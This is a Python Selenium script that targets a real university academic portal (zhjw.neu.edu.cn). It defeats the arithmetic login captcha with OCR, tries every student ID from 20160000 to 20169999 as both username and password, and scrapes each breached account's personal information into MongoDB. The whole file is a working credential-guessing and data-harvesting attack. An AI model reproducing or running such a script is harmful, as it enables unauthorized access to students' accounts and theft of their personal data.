# -*- coding: utf-8 -*-
#!/usr/bin/env python


import pytesseract as rec
import time
from conf import *
import pymongo

from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import UnexpectedAlertPresentException
from bs4 import BeautifulSoup
from PIL import ImageOps
from PIL import Image


client = pymongo.MongoClient(MONGO_URL)
db = client[MONGO_DB]

options = webdriver.ChromeOptions()
options.add_argument('headless')
driver = webdriver.Chrome(chrome_options=options)
# You can set chrome_options empty to see how it works
wait = WebDriverWait(driver, 10)


def login(usr, pwd):
    try:
        driver.get('https://zhjw.neu.edu.cn/')
        username = wait.until(EC.presence_of_element_located(
            (By.CSS_SELECTOR, '#WebUserNO')))
        password = wait.until(EC.presence_of_element_located(
            (By.CSS_SELECTOR, '#Password')))
        captcha = wait.until(EC.presence_of_element_located(
            (By.CSS_SELECTOR, '#Agnomen')))
        submit = wait.until(
            EC.element_to_be_clickable(
                (By.CSS_SELECTOR, '#submit7'))
        )
        img = wait.until(EC.presence_of_element_located(
            (By.CSS_SELECTOR, '#main > div:nth-child(3) > form > div > div:nth-child(3) > img')))
        left = int(img.location['x'])
        right = int(img.location['x'] + img.size['width'])
        top = int(img.location['y'])
        bottom = int(img.location['y'] + img.size['height'])
        driver.save_screenshot('screenshot.png')
        image = Image.open('screenshot.png')
        image = image.crop((left, top, right, bottom))
        text = cleanFile(image)
        answer = crackCaptcha(text)
        username.send_keys(usr)
        password.send_keys(pwd)
        captcha.send_keys(answer)
        submit.click()
        time.sleep(1)
        alert = driver.switch_to_alert()
        alert.accept()
        getInfo()
    except UnexpectedAlertPresentException:
        print('密码错误', usr)
        alert = driver.switch_to_alert()
        alert.accept()
    except TimeoutException:
        login(usr, pwd)
    except ValueError:
        login(usr, pwd)
    # ActionChains(driver).key_down(Keys.ENTER).key_up(Keys.ENTER)


def cleanFile(img):
    img = img.point(lambda x: 0 if x < 143 else 255)
    borderImage = ImageOps.expand(img, border=20, fill='white')
    text = rec.image_to_string(borderImage)
    return text


def crackCaptcha(text):
    text = text.replace(' ', '')
    Number1 = int(text[0])
    Number2 = int(text[2])
    if text[1] == '+':
        return Number1 + Number2
    else:
        return Number1 * Number2


def getInfo():
    driver.switch_to_frame("mainFrame")
    driver.switch_to_frame("_Content")
    info = {}
    html = driver.page_source
    soup = BeautifulSoup(html, 'html5lib')
    for i, tr in enumerate(soup.find_all('tr')):
        if i > 1:
            tds = tr.find_all('td')
            info[tds[1].text] = tds[2].text.replace('\xa0', '')
    save_to_mongo(info)


def save_to_mongo(result):
    try:
        if db[MONGO_TABLE].insert(result):
            print('success', result)
    except Exception:
        print('failed', result)


def main():
    for number in range(20160000, 20169999):
        login(str(number), str(number))
    driver.close()


if __name__ == '__main__':
    main()
